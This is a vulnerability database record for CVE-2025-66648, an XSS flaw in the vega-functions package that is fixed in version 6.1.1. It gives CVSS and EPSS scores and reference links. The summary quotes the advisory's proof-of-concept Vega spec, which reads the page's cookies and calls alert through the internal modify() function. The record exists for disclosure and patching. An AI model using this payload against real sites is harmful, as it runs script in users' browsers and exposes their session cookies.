vulnerability_id: VCID-ypvh-g6zb-hyg6
aliases:
  - CVE-2025-66648
  - GHSA-m9rg-mr6g-75gm
summary: "`vega-functions` vulnerable to Cross-site Scripting via `setdata` function\n### Impact\n\
  \nFor sites that allow users to supply untrusted user input, malicious use of an internal\
  \ function (not part of the [public API](https://vega.github.io/vega/docs/expressions/)) could\
  \ be used to run unintentional javascript (XSS).\n\n### Patches\n\nFixed in vega-functions\
  \ `6.1.1`\n\n### Workarounds\n\nThere is no workaround besides upgrading. Using `vega.expressionInterpreter`\
  \ as described in [CSP safe mode](https://vega.github.io/vega/usage/interpreter/) does not\
  \ prevent this issue.  \n\n\n### Exploit Proof of Concept\n\nVega's expression `modify()`\
  \ [function](https://github.com/vega/vega/blob/d8add5819346e5af597d82ef8253742acc0283ba/packages/vega-functions/src/functions/modify.js#L40),\
  \ used by setdata, allows attacker to control both the method called and the values supplied,\
  \ which results to XSS . This was a previous POC:\n\n\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v6.json\"\
  ,\n  \"data\": [\n    {\n      \"name\": \"table\",\n      \"values\": [\n        {\"category\"\
  : \"A\", \"amount\": 28}\n      ]\n    }\n  ],\n  \"signals\": [\n    {\n      \"name\": \"\
  tooltip\",\n      \"value\": {},\n      \"on\": [\n        {\"events\": {\"type\":\"timer\"\
  ,\"throttle\":2000}, \"update\": \"setdata('table',[['Domain: '+event.dataflow._el.ownerDocument.domain+'\
  \ , cookies: '+ event.dataflow._el.ownerDocument.cookie ]])+warn('XSS is here', modify('table',2,3,null,event.dataflow._el.ownerDocument.defaultView.alert,{'tttt':'yyyy'})\
  \ )\"},\n        {\"events\": \"rect:pointerout\",  \"update\": \"{}\"}\n      ]\n    }\n\
  \  ]\n}\n```"
severities:
  - score: '7.2'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    published_at: None
    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-66648.json
  - score: '0.00029'
    scoring_system: epss
    scoring_elements: '0.0777'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-66648
  - score: '0.00038'
    scoring_system: epss
    scoring_elements: '0.11303'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-66648
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-m9rg-mr6g-75gm
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/vega/vega
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/vega/vega
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-06T15:40:01Z/
    published_at: None
    url: https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-66648
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-66648
weaknesses:
  - CWE-79
references:
  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-66648.json
    reference_type:
    reference_id:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-66648
    reference_type:
    reference_id:
  - url: https://github.com/vega/vega
    reference_type:
    reference_id:
  - url: https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-66648
    reference_type:
    reference_id:
  - url: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1125185
    reference_type:
    reference_id: 1125185
  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2427238
    reference_type:
    reference_id: 2427238
  - url: https://github.com/advisories/GHSA-m9rg-mr6g-75gm
    reference_type:
    reference_id: GHSA-m9rg-mr6g-75gm
